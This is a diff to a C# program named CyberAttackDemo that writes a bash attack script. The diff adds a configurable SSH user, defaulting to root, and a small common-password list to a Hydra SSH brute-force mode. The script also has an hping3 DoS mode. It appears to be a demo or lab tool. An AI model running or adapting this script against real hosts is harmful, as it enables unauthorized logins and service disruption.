@@ -89,7 +89,8 @@ namespace CyberAttackDemo
                     OnLogReceived?.Invoke($"[SYSTEM] Created directory: {dir}");
                 }
 
-                // 常に最新の内容で上書きする
+                // 機能更新のため、常に上書きする設定に変更
+                // if (!File.Exists(AttackScriptName)) 
                 {
                     string scriptContent = @"#!/bin/bash
 
@@ -102,6 +103,7 @@ fi
 TARGET_IP=${1:-""127.0.0.1""}
 DURATION=${2:-""15""}
 MODE_ARG=${3:-""dos""}
+SSH_USER=${4:-""root""}
 
 PORT=80
 THREADS=4
@@ -128,11 +130,19 @@ echo ""------------------------------------------""
 if [ ""$MODE_ARG"" = ""hydra"" ]; then
     # --- Hydra SSH Crack ---
     echo ""[*] Starting Hydra SSH Password Cracking...""
+    echo ""[*] Target User: $SSH_USER""
     
-    # 指定されたコマンドに変更
-    # -l test: ユーザー名 test
-    # -P /usr/share/wordlists/rockyou.txt: ロックユー辞書
-    hydra -l test -P /usr/share/wordlists/rockyou.txt ssh://$TARGET_IP -t 4 -V -e ns
+    # デモ用パスワードリスト作成
+    echo ""123456"" > passlist.txt
+    echo ""password"" >> passlist.txt
+    echo ""admin"" >> passlist.txt
+    echo ""root"" >> passlist.txt
+    echo ""kali"" >> passlist.txt
+    
+    # Hydra実行 (ユーザー名を引数から指定)
+    hydra -l $SSH_USER -P passlist.txt ssh://$TARGET_IP -t 4 -V -e ns
+    
+    rm passlist.txt
 
 else
     # --- DoS Attack (hping3) ---
